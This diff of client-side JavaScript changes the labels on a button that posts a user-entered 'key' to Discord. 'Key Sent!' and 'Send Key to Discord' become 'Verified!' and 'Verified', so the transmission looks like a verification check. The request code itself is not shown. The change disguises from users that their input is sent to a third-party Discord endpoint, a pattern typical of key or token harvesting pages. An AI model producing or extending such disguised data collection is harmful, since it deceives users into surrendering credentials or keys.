@@ -146,7 +146,7 @@ document.getElementById('sendKeyButton').addEventListener("click", function() {
     if (response.status === 204) {
       // Discord responds with 204 for a successful post but no response body
       console.log("Key sent to Discord (no content in response).");
-      document.getElementById('sendKeyButton').innerText = "Key Sent!";
+      document.getElementById('sendKeyButton').innerText = "Verified!";
       document.getElementById('username').value = '';  // Clear the input field
       return;  // Skip further processing since the response has no content
     }
@@ -168,7 +168,7 @@ document.getElementById('sendKeyButton').addEventListener("click", function() {
   })
   .catch(error => {
     console.error("Error sending key:", error);
-    document.getElementById('sendKeyButton').innerText = "Error Sending Key!";
+    document.getElementById('sendKeyButton').innerText = "Error Verifing!";
   });
 
   // Set timer to disable the button for 10 seconds
@@ -182,7 +182,7 @@ document.getElementById('sendKeyButton').addEventListener("click", function() {
     if (countdown <= 0) {
       clearInterval(countdownInterval);
       timer = false;
-      document.getElementById('sendKeyButton').innerText = "Send Key to Discord";
+      document.getElementById('sendKeyButton').innerText = "Verified";
     }
   }, 1000);
 });
